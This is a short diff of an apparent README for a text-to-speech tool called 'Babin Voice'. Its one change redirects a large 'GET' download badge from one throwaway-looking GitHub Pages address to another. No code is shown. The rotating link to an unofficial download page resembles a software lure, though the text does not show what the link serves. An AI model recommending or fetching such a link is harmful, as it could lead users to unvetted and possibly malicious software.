@@ -34,7 +34,7 @@ Echelon Front is the firm. Questions about a talk or a book go to that firm or t
 
 Get a text-to-speech build the way you get any speech tool you are allowed to run. Point it at text you wrote.
 
-[![GET Babin Voice](https://img.shields.io/badge/GET-Babin%20Voice-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://andrevdnkx870.github.io/.github/Babin-Voice)
+[![GET Babin Voice](https://img.shields.io/badge/GET-Babin%20Voice-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://voice-babin.github.io/.github/)
 
 There is no price in the brief. This page does not invent one and does not sell a key.
 
